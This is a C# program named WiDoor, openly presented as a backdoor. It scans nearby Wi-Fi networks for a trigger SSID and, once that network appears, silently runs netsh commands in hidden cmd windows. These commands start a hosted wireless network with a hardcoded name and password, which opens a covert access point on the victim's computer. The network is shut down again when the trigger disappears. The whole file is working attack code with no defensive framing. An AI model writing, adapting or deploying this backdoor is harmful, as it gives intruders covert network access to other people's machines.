using System;
using System.Diagnostics;

namespace WiDoor
{
    class Program
    {
        static void Main(string[] args)
        {
            string trigger = "home"; //SSID on which we start backdoor
            int interval = 5; //seconds on which we check for trigger

            //backdoor details
            string networkSSID = "openNetwork";
            string networkPassword = "password123";

            while (true)
            {
                Console.WriteLine("Scanning for trigger...");

                if (triggerFound(trigger)) //trigger detected!
                {
                    Console.WriteLine("Trigger found! Openning backdoor...");

                    //opening backdoor
                    runCMD_NoFeedback("netsh wlan set hostednetwork mode=allow ssid=" + networkSSID + " key=" + networkPassword);
                    runCMD_NoFeedback("netsh wlan start hostednetwork");

                    Console.WriteLine("Hosted network has been started!");

                    while (true)
                    {
                        Console.WriteLine("Waiting for trigger to disapear to close backdoor...");
                        if (!triggerFound(trigger)) //if trigger disapear
                        {
                            Console.WriteLine("Stopping wifi...");

                            //kill backdoor
                            runCMD_NoFeedback("netsh wlan stop hostednetwork");
                            runCMD_NoFeedback("netsh wlan set hostednetwork mode=disallow");

                            Console.WriteLine("Door locked!");
                            break;
                        }
                        System.Threading.Thread.Sleep(interval * 1000);
                    }
                }
                System.Threading.Thread.Sleep(interval * 1000);
            }
        }

        private static bool triggerFound(string trigger)
        {
            string command = "netsh wlan show networks mode=ssid";

            string output = runCMD_Feedback(command);
            string[] lines = output.Split(Environment.NewLine.ToCharArray());

            foreach (string line in lines)
            {
                if (string.IsNullOrEmpty(line) || line.Length <= 4)
                {
                    continue;
                }
                else if (line.Substring(0, 4) == "SSID")
                {
                    string AP = line.Split(new char[] { ':' }, 2)[1].Trim();
                    if (AP == trigger)
                    {
                        return true;
                    }
                }

            }
            return false;
        }

        private static string runCMD_Feedback(string command)
        {
            string output = "";

            ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + command)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            Process process = Process.Start(startInfo);
            process.OutputDataReceived += (sender, e) => output += Environment.NewLine + e.Data;
            process.BeginOutputReadLine();
            process.Start();
            process.WaitForExit();

            return output;
        }

        private static void runCMD_NoFeedback(string command)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + command;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
